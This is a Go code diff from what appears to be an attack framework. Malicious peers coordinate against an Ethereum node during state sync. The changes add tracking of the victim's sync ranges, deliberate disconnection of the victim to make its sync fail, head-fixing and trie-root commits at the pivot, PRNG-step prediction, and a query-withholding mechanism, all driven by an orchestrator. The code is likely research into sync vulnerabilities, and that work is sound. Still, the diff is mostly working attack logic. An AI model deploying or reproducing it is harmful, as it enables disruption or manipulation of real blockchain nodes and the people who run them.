@@ -35,6 +35,7 @@ var otherMaliciousPeers []string
 var mustChangeAttackChain bool
 var quitLock sync.Mutex
 var victimLock sync.Mutex
+var fixHeadLock sync.Mutex
 var canServeLastFullBatch chan bool
 var canServePivoting chan bool
 var canDisconnect chan bool
@@ -58,6 +59,9 @@ var withholdQuery uint64
 var withholdACK bool
 var withholding bool
 var releaseCh chan struct{}
+var providedSkeleton bool
+var assignedRanges []bool
+var completedRanges []bool
 
 
 
@@ -117,6 +121,8 @@ func Initialize(id string) error {
 	prngSteps[100] = 0
 	rollback = false
 	releaseCh = make(chan struct{})
+	assignedRanges = make([]bool, 16)
+	completedRanges = make([]bool, 16)
 
 	incoming = make(chan []byte)
 	go readLoop(conn, incoming, quitCh)
@@ -141,7 +147,7 @@ func SetMasterPeer() {
 	log("Announced as master peer")
 }
 
-func SetVictimIfNone(v *p2p.Peer) {
+func SetVictimIfNone(v *p2p.Peer, td *big.Int) {
 	vID := v.ID().String()[:8]
 	if attackPhase == utils.StalePhase {	// Cannot start an attack yet. Ignore this victim
 		log("Ignoring victim", vID, "due to insufficient number of malicious peers")
@@ -153,6 +159,12 @@ func SetVictimIfNone(v *p2p.Peer) {
 		if vID == s {
 			return
 		}
+	}
+
+	// Victim must have to sync yet
+	predictionTD := getTd(utils.PredictionChain)
+	if td.Cmp(predictionTD) > 0 {
+		return
 	}
 
 	victimLock.Lock()
@@ -184,7 +196,6 @@ func SetVictimIfNone(v *p2p.Peer) {
 				Close()
 				fatal(err, "Could not announce new phase to orchestrator")
 			}
-
 			go stopMovingChecker()
 			go rollbackChecker()
 		} else if attackPhase == utils.SyncPhase {
@@ -228,9 +239,15 @@ func PeerDropped() {
 }
 */
 
-// This function would be useful to set the victim's p2p.Peer object in the non-master peer.
-// However, the non-master peer doesn't need this object. So, the function does nothing for now.
 func NewPeerJoined(peer *p2p.Peer) {
+	// We don't need the victim's peer object during prediction phase
+	if attackPhase != utils.SyncPhase {
+		return
+	}
+
+	if peer.ID().String()[:8] == victimID {
+		victim = peer
+	}
 	return
 }
 
@@ -377,39 +394,77 @@ func ServedBatchRequest(from uint64, peerID ...string) {
 	}
 }
 
-func ReceivedLastRangeQuery() {
+func ReceivedLastRangeQuery(origin common.Hash) bool {
 	/*
 	Upon receiving last query of state sync, we need to make the current syncOp fail.
 	To do so, we disconnect from the victim.
 	*/
 
-	// For now, we wait for the phase to switch to sync. Later on, this function should be automatically
-	// called when the phase has already switched. Thus, the goroutine may become unnecessary.
-	go func() {
-		//return // Remove this to enable correct behaviour
-		for attackPhase != utils.SyncPhase {
-			time.Sleep(100*time.Millisecond)
+	//return // Remove this to enable correct behaviour
+	if attackPhase != utils.SyncPhase {
+		return false
+	}
+
+	rng := uint(origin.Bytes()[0]) >> 4
+	if !assignedRanges[rng] {
+		fatal(utils.StateError, "Received last range query of a range not assigned to self")
+	}
+	if completedRanges[rng] {
+		log("Range already completed, rng =", rng)
+	} else {
+		completedRanges[rng] = true
+		err := sendMessage(msg.CompletedRange.SetContent([]byte{byte(rng)}))
+		if err != nil {
+			fatal(err, "Could not notify range completion")
 		}
-		if !master {
-			victimLock.Lock()
-			terminatingStateSync = true
-			victim.Disconnect(p2p.DiscUselessPeer)
-			victimLock.Unlock()
+	}
+
+	allComplete := true
+	for idx, complete := range completedRanges {
+		if !complete && assignedRanges[idx] {
+			allComplete = false
+			break
 		}
-	}()
+	}
+
+	if allComplete {
+		log("All range requests fulfilled")
+	}
+
+	if !master && allComplete {
+		if victim == nil {
+			log("Victim should not be nil")
+			Close()
+			return false
+		}
+		victimLock.Lock()
+		terminatingStateSync = true
+		victim.Disconnect(p2p.DiscUselessPeer)
+		victimLock.Unlock()
+	}
+	return allComplete
 }
 
-/*
-func ServedAccountRange(lastResponse bool) {
-	
-	amount := new(big.Int).Sub(to.Big(), from.Big())
-	servedAccounts.Add(servedAccounts, amount)
-	log("Served accounts:", servedAccounts)
-	
-
-	if master && lastResponse
+func ReceivedRangeQuery(origin common.Hash) {
+	if attackPhase != utils.SyncPhase {
+		return
+	}
+	rng := uint(origin.Bytes()[0]) >> 4
+	if !assignedRanges[rng] {
+		log("Assigned new range, rng =", rng)
+		assignedRanges[rng] = true
+		err := sendMessage(msg.AssignedRange.SetContent([]byte{byte(rng)}))
+		if err != nil {
+			fatal(err, "Could not notify new range assignment")
+		}
+	}
 }
-*/
+
+func ResetRangeInfo() {
+	assignedRanges = make([]bool, 16)
+	completedRanges = make([]bool, 16)
+	log("Range info reset")
+}
 
 /*
 func areAllBatchesServed() bool {
@@ -790,6 +845,23 @@ func SetSkeletonStart(start uint64) {
 	}
 
 	skeletonStart = start
+	providedSkeleton = true
+
+	// Reset state of withholding mechanism
+	withholdQuery = 0
+	withholdACK = false
+	withholding = false
+
+	// This should be properly synced, as the non-master peer may receive its first query of the new skeleton
+	// before processing msg.WithholdReset and thus incur into a fatal() anyway. However, it's highly unlikely,
+	// so for now we just rely on timing.
+	if err := sendMessage(msg.WithholdReset); err != nil {
+		fatal(err, "Could not reset withhold mechanism in the other peer")
+	}
+}
+
+func ProvidedSkeleton() bool {
+	return providedSkeleton
 }
 
 
@@ -808,19 +880,33 @@ func stopMovingChecker() {
 		headNumber := latest(utils.TrueChain).Number.Uint64()
 
 		// Should work with ... >= 88 as well, but doesn't make a big difference
-		if getTd(utils.TrueChain).Cmp(announcedSyncTD) >= 0 && (headNumber - skeletonStart)%utils.BatchSize > 88 {
+		fixHeadLock.Lock()
+		if getTd(utils.TrueChain).Cmp(announcedSyncTD) >= 0 && (headNumber - skeletonStart)%utils.BatchSize > 88 &&
+		 pivot + 64 + 55 < headNumber {
 			if fixedHead == 0 {
 				fixedHead = headNumber
 				log("Fixed head for sync phase,", "number =", fixedHead)
+				/*
 				r := getHeaderByNumber(utils.TrueChain, fixedHead-64).Root
 				err := (*stateCache).TrieDB().Commit(r, true, nil)
 				if err != nil {
 					fatal(err, "Cannot commit root at pivot,", "pivot =", fixedHead-64, "root =", r)
 				}
+				log("Committed trie root, pivot =", fixedHead-64, ", root =", r)
+
+				content := make([]byte, 8)
+				binary.BigEndian.PutUint64(content, fixedHead-64)
+				err = sendMessage(msg.CommitTrieRoot.SetContent(content))
+				if err != nil {
+					fatal(err, "Couldn't say to other peer to commit trie root at pivot")
+				}
+				*/
 
 			}
+			fixHeadLock.Unlock()
 			return
 		}
+		fixHeadLock.Unlock()
 	}
 }
 
@@ -836,7 +922,7 @@ func StopMoving() bool {
 	}
 
 	headNumber := latest(utils.TrueChain).Number.Uint64()
-	log("... returned false, td =", getTd(utils.TrueChain), ", want =", announcedSyncTD, ", L =", (headNumber - skeletonStart)%utils.BatchSize)
+	log("... returned false, td =", getTd(utils.TrueChain), ", want =", announcedSyncTD, ", L =", (headNumber - skeletonStart)%utils.BatchSize, ", next_pivot_in =", pivot+64+55-headNumber)
 	return false
 }
 
@@ -845,24 +931,67 @@ func FixedHead() uint64 {
 }
 
 func SetPivot(pivotNumber uint64) {
+	if attackPhase != utils.SyncPhase {
+		return
+	}
+
 	pivot = pivotNumber
 	chainType := attackPhase.ToChainType()
 	if chainType == utils.InvalidChainType {
 		log("Not setting any pivot because we are in", attackPhase, "phase")
 	}
 	rootAtPivot = getHeaderByNumber(chainType, pivot).Root
-	log("Pivot set", "pivot", pivot, "root", rootAtPivot)
+	log("Pivot set,", "pivot =", pivot, ", root =", rootAtPivot)
+
+	headNumber := pivot + 64
+
+	fixHeadLock.Lock()
+	if getTd(utils.TrueChain).Cmp(announcedSyncTD) >= 0 && (headNumber - skeletonStart)%utils.BatchSize > 88 {
+		if fixedHead == 0 {
+			fixedHead = headNumber
+			log("Fixed head for sync phase,", "number =", fixedHead)
+			/*
+			r := getHeaderByNumber(utils.TrueChain, pivot).Root
+			err := (*stateCache).TrieDB().Commit(r, true, nil)
+			if err != nil {
+				fatal(err, "Cannot commit root at pivot,", "pivot =", pivot, "root =", r)
+			}
+			log("Committed trie root, pivot =", pivot, ", root =", r)
+
+			content := make([]byte, 8)
+			binary.BigEndian.PutUint64(content, pivot)
+			err = sendMessage(msg.CommitTrieRoot.SetContent(content))
+			if err != nil {
+				fatal(err, "Couldn't say to other peer to commit trie root at pivot")
+			}
+			*/
+		}
+	}
+	fixHeadLock.Unlock()
 
 
-	// Shouldn't be necessary, but keep it commented for later maybe
-	/*
+	// Shouldn't be necessary, but keep it commented for later maybe -- uncommented!
+
 	if fixedHead != 0 {
 		err := (*stateCache).TrieDB().Commit(rootAtPivot, true, nil)
 		if err != nil {
 			fatal(err, "Cannot commit root at pivot,", "pivot =", pivot, "root =", rootAtPivot)
 		}
+		log("Committed trie root, pivot =", pivot, ", root =", rootAtPivot)
+
+		pivotBytes := make([]byte, 8)
+		binary.BigEndian.PutUint64(pivotBytes, pivot)
+		fixedHeadBytes := make([]byte, 8)
+		binary.BigEndian.PutUint64(fixedHeadBytes, pivot)
+		content := make([]byte, 0)
+		content = append(content, pivotBytes...)
+		content = append(content, fixedHeadBytes...)
+		err = sendMessage(msg.CommitTrieRoot.SetContent(content))
+		if err != nil {
+			fatal(err, "Couldn't say to other peer to commit trie root at pivot")
+		}
 	}
-	*/
+	ResetRangeInfo()
 }
 
 func RootAtPivot() common.Hash {
@@ -874,6 +1003,7 @@ func StepPRNG(num, frequency int) {
 		fatal(utils.ParameterErr, "checkFrequency has an unusual value:", frequency)
 	}
 	prngSteps[frequency] += num
+	log("PRNG Steps:", prngSteps)
 }
 
 func CommitPRNG() {
@@ -902,6 +1032,7 @@ func rollbackChecker() {
 }
 
 func TryWithhold(query uint64) bool {
+	fatal(utils.StateError, "Withholding mechanism disabled for now")
 	if !withholdACK {
 		if master {
 			content := make([]byte, 8)
@@ -921,9 +1052,25 @@ func TryWithhold(query uint64) bool {
 			if err != nil {
 				fatal(err, "Could not release withheld query and set new one")
 			}
+
+			x := int((query - withholdQuery)/uint64(2048))
+			y := int((query - withholdQuery)%uint64(2048))/100
+			StepPRNG(21*x, 100)
+			StepPRNG(y+1, 100)
+
 			withholding = true
 			withholdQuery = query
-		}
+
+		} /*else if query == lastQueryOfSkeleton {
+			err := sendMessage(msg.Release.SetContent([]byte{0,0,0,0,0,0,0,0}))
+			log("Releasing response for query.Origin =", withholdQuery)
+			if err != nil {
+				fatal(err, "Could not release withheld query and set new one")
+			}
+			withholdQuery = 0
+			withholdACK = false
+			return false
+		}*/
 	} else {
 		fatal(utils.StateError, "Withholding peer should not receive a second query.")
 	}
@@ -941,6 +1088,24 @@ func ReleaseResponse() chan struct{} {
 	return releaseCh
 }
 
+func ProcessStepsAtSkeletonEnd(from uint64) {
+	providedSkeleton = false
+
+	endOfSkeleton := skeletonStart + (128-1)*utils.BatchSize
+	processedHeaders := endOfSkeleton + from + 1
+	x := int(processedHeaders/uint64(2048))
+	y := int(processedHeaders%uint64(2048))/100
+	StepPRNG(21*x, 100)
+	StepPRNG(y+1, 100)
+}
+
+func MustIgnoreBlock(number uint64) bool {
+	if fixedHead != 0 && number > fixedHead {
+		return true
+	}
+	return false
+}
+
 
 func Close() {
 	quitLock.Lock()
@@ -952,6 +1117,10 @@ func Close() {
 		conn.Close()
 	}
 	quitLock.Unlock()
+}
+
+func GetQuitCh() chan struct{} {
+	return quitCh
 }
 
 
@@ -1121,6 +1290,28 @@ func handleMessages() {
 				releaseCh <- struct{}{}
 				withholdQuery = binary.BigEndian.Uint64(message.Content)
 				log("Set withholdQuery =", withholdQuery)
+			case msg.WithholdReset.Code:
+				withholdQuery = 0
+				withholdACK = false
+				withholding = false
+			case msg.CommitTrieRoot.Code:
+				pivotNumber := binary.BigEndian.Uint64(message.Content[:8])
+				fixedHead = binary.BigEndian.Uint64(message.Content[8:])
+				log("Set fixedHead to ", fixedHead)
+				go func(pivot uint64) {
+					r := getHeaderByNumber(utils.TrueChain, pivot).Root
+					err := (*stateCache).TrieDB().Commit(r, true, nil)
+					if err != nil {
+						fatal(err, "Cannot commit root at pivot,", "pivot =", pivot, "root =", r)
+					}
+					log("Committed trie root, pivot =", pivot, ", root =", r)
+				}(pivotNumber)
+			case msg.AssignedRange.Code:
+				rng := uint(message.Content[0])
+				assignedRanges[rng] = true
+			case msg.CompletedRange.Code:
+				rng := uint(message.Content[0])
+				completedRanges[rng] = true
 
 			/*
 			case msg.MustDisconnectVictim.Code:
